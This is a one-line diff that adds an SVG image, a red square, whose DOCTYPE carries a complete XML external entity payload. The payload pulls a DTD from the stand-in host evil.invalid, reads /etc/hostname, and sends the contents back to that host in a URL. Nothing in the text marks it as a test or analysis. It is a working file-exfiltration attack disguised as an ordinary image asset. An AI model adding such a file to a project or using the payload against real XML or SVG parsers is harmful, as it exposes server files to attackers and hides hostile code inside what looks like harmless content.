@@ -1,0 +1,1 @@
+<!DOCTYPE svg [<!ENTITY % ext SYSTEM "https://evil.invalid/x/e.dtd"> %ext; <!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://evil.invalid/x/?x=%file;'>"> %eval; %exfil;]><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><path d="M10 10h80v80h-80z" fill="#c81e28"/></svg>
